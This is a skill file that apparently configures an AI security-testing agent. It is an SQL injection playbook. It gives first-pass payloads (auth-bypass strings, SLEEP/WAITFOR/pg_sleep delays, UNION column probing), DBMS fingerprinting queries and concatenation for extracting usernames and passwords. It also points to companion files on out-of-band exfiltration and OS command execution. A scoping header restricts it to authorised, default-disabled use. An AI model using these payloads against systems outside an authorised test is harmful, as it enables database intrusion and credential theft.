---
name: sqli-sql-injection
description: >-
  SQL injection playbook. Use when input reaches SQL queries, authentication logic, sorting, filtering, reporting, or DB-specific blind and out-of-band execution paths.
---

# SKILL: SQL Injection — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Advanced SQLi techniques. Assumes basic UNION/error/boolean-blind fundamentals known. Focuses on: per-database exploitation, out-of-band exfiltration, second-order injection, parameterized query bypass scenarios, filter evasion, and escalation to OS. For real-world CVE cases, SMB/DNS OOB exfiltration, INSERT/UPDATE injection patterns, and framework-specific exploitation (ThinkPHP, Django GIS), inspect the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. QUICK START

### Extended Scenarios

Also inspect [SCENARIOS.md](./SCENARIOS.md) when you need:
- SMB out-of-band exfiltration via `LOAD_FILE` + UNC paths (Windows MySQL)
- KEY injection / URI injection / non-parameter injection points
- INSERT/DELETE/UPDATE statement injection differences
- ThinkPHP5 array key injection (`updatexml` error-based)
- Django GIS Oracle `utl_inaddr.get_host_name` CVE
- ORDER BY / LIMIT injection techniques

### Advanced Reference

Also inspect [SQLMAP_ADVANCED.md](./SQLMAP_ADVANCED.md) when you need:
- SQLMap tamper scripts matrix and WAF bypass tamper chain recipes (space2comment, between, charencode, etc.)
- `--technique`, `--risk`/`--level` combinations and `--second-url` for second-order injection
- `--os-shell` / `--os-pwn` OS-level exploitation via SQLMap
- INSERT/UPDATE/DELETE injection patterns with data exfiltration examples
- GraphQL + SQL injection (batched queries, nested field injection, mutation injection)
- DB-specific advanced functions: PostgreSQL dollar-sign quoting, MSSQL linked servers, Oracle DBMS_PIPE/DBMS_SCHEDULER

If you have only confirmed a suspicious SQL sink, do not load extra payload skills first; complete first-pass validation here.

### First-pass payload families

| Situation | Start With | Why |
|---|---|---|
| Login or boolean branch | `' or 1=1--` | Fast signal on auth or conditional checks |
| Numeric parameter | `1 or 1=1` | Avoid quote dependency |
| ORDER BY / sorting | `1,2,3` then `1 desc--` | Good for structural probing |
| Visible SQL errors | `'` then DBMS-specific error probes | Error text gives DBMS clues |
| No visible output | time-based payloads | Stable fallback for blind targets |
| Heavy filtering / WAF | polyglot or whitespace-free variants | Expands parser confusion surface |

### Small, stable first-pass set

```text
'
' or 1=1--
' or '1'='1'--
1 or 1=1
') or ('1'='1
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'||(SELECT pg_sleep(5))--
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
' order by 1--
' union select null--
```

### DBMS routing hints

| Clue | Likely DBMS | Good Next Move |
|---|---|---|
| `You have an error in your SQL syntax` | MySQL | try `SLEEP()` and `@@version` |
| `Microsoft OLE DB Provider` | MSSQL | try `WAITFOR DELAY` |
| `PG::` / `PostgreSQL` | PostgreSQL | try `pg_sleep()` |
| `ORA-` prefix | Oracle | pivot to out-of-band or XML features |
| SQLite errors, local apps | SQLite | focus on boolean/UNION and file-backed behavior |

---

## 1. DETECTION — SUBTLE INDICATORS

Most SQLi is found by **behavioral differences**, not errors:

| Signal | Meaning |
|---|---|
| Page loads differently with `'` vs `''` | String context injection point |
| Numeric: `1` vs `1-1` vs `2-1` returns same | Arithmetic evaluated |
| `1=1` vs `1=2` in condition changes result | Boolean-based injection |
| SELECT with ORDER BY N: column count enumeration | UNION prep |
| Time delay: `'; WAITFOR DELAY '0:0:5'--` | Blind/time-based |
| 500 error on `'`, 200 on `''` | Unhandled exception = SQLi |
| Different HTTP response size | Boolean blind indicator |

**Critical**: test in ALL parameter types — URL query, POST body, JSON fields, XML values, HTTP headers (X-Forwarded-For, User-Agent, Referer, Cookie values).

---

## 2. DATABASE FINGERPRINTING

```sql
-- MySQL
VERSION()              -- returns version string
@@datadir              -- data directory
@@global.secure_file_priv  -- file read restriction

-- MSSQL
@@VERSION              -- includes "Microsoft SQL Server"
DB_NAME()              -- current database
USER_NAME()            -- current user

-- Oracle
v$version              -- SELECT banner FROM v$version WHERE ROWNUM=1
sys.database_name      -- current db (alternative)
user                   -- current Oracle user

-- PostgreSQL
version()              -- returns version
current_database()     -- current db
current_user           -- current user
```

**Error-based fingerprint**: inject `'` and read error message format. MySQL errors differ from Oracle/MSSQL.

---

## 3. UNION-BASED DATA EXTRACTION

**Column count determination**:
```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY N--   ← until error = N-1 columns
```

**Column type detection** (NULL is safest):
```sql
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--  ← find string column
```

**Database-specific string concat** (required when column accepts only int):
```sql
-- MySQL
CONCAT(username,0x3a,password)

-- MSSQL
username+'|'+password

-- Oracle
username||'|'||password

-- PostgreSQL
username||':'||password
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 4. BLIND INJECTION — INFERENCE TECHNIQUES
- 5. OUT-OF-BAND (OOB) EXFILTRATION — CRITICAL
- 6. ESCALATION — OS COMMAND EXECUTION
- 7. SECOND-ORDER INJECTION
- 8. PARAMETERIZED QUERY BYPASS SCENARIOS
- 9. FILTER EVASION TECHNIQUES
- 10. DATABASE METADATA EXTRACTION
- 11. STORED PROCEDURE ABUSE
- … plus 3 additional sections
